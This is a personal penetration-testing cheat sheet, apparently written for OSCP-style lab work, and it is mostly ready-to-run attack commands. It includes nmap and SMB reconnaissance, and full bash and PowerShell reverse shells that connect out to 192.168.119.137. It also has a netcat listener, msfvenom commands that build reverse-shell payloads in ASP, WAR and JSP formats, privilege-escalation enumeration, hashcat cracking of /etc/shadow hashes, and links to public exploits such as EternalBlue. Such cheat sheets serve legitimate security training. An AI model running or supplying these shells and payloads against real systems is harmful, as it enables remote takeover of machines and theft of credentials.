# Pentest Cheat Sheet
There are many cheat sheets out there, but this is mine.


## Recon

### Port Scanning

`nmap -sn 10.11.1.0/24` network sweep to find hosts. 
  * `nmap -sn  10.11.1.0/24 -oG - | awk '/Up$/{print $2}' > list_ips.txt` sweep network for IP's that are up, and save the IP addresses in a list.

`nmap -A 10.10.10.10` for a quick scan of common TCP ports with OS and service detection.

`nmap -A 10.10.10.10 -p-` to scan all TCP ports with OS and service detection.

`nmap -A -sU 10.10.10.10` to scan all UDP ports with OS and service detection.

`nmap -O -A -sV 10.10.10.10` to scan all common TCP ports, finger print the OS, run scrips and grab banners.


### Directory Enumeration

### SMB Enumeration
`smbclient -L 10.11.1.146` To list availble shares

`smbclient //10.11.1.146/IPC$` to login to that share. If that doesn't work, try to sudo... `sudo smbclient //10.11.1.146/IPC$`


## Reverse Shells

### Bash
`/bin/bash -i >& /dev/tcp/192.168.119.137/1337 0>&1`

### PowerShell
```
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.119.137',1337);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### Listeners

#### Netat
`nc -lvp 4444` listen (catch) reverse shell with Netcat on port 4444

### Span TTY Shell
`python -c 'import pty; pty.spawn("/bin/bash")'`

### MSFVenom
#### ASP
`msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.137 LPORT=4444 -f asp > shell.asp`

#### WAR
`msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.119.137 LPORT=4444 -f war > shell.war`

#### JSP
This also works for Cold Fusion instead of the crazy web shell
`msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.119.137 LPORT=4444 -f raw > shell.jsp`


## Privilege Escalation
### Linux

`sudo -l`, if there's anything interesting like running scripts as users with `NOPASSWD: ALL`.

#### Distro Version
* `cat /etc/issue`

#### Kernel Version and Architecture
* `uname -r `
* `arch`

#### Find Writable Directories
`find / -writable -type d 2>/dev/null`

#### View SUID Binaries
`find / -perm -u=s -type f 2>/dev/null`

#### Processes Running
`ps axu` 

### Windows
`systeminfo` to get good info.

`tasklist /SVC` to view running services.



## Password Cracking

### /etc/shadow
Hash algorithm cheat sheet `bob:$1$Rrhb4lzg$Ee8/JYZjv.NimwyrSEL6R/:16903:0:99999:7:::`

* $1$ is MD5 (md5crypt) 
* $2a$ is Blowfish
* $2y$ is Blowfish
* $5$ is SHA-256
* $6$ is SHA-512

The salt is `Rrhb4lzg`

The hash is `Ee8/JYZjv.NimwyrSEL6R/`

Crack via hashcat 
1. Create hashfile `1$Rrhb4lzg$Ee8/JYZjv.NimwyrSEL6R/` as bob.hash
2. Examples
  * `hashcat -m 500 -a 0 bob.hash /usr/share/wordlists/rockyou.txt --force` for $1$
  * `hashcat -m 1800 -a 0 bob.hash /usr/share/wordlists/rockyou.txt --force` for $6$

[Hashcat modes](https://hashcat.net/wiki/doku.php?id=example_hashes)

## Useful Exploits

### Linux/Unix
#### Postfix Shell SHock
 * [postfix-shellshock-nc.py](https://github.com/3mrgnc3/pentest_old/blob/master/postfix-shellshock-nc.py)

### Windows
#### MS17-010 (Eternal Blue)
* [AutoBlue](https://github.com/3ndG4me/AutoBlue-MS17-010)

#### MS03-026
* [RPC DCOM](https://www.exploit-db.com/exploits/66)

### Apache Tomcat
#### CVE-2017-12617
* [CVE-2017-12617](https://github.com/cyberheartmi9/CVE-2017-12617)


## Further Help
* [Total OSCP Guide](https://sushant747.gitbooks.io/total-oscp-guide/content/reverse-shell.html)
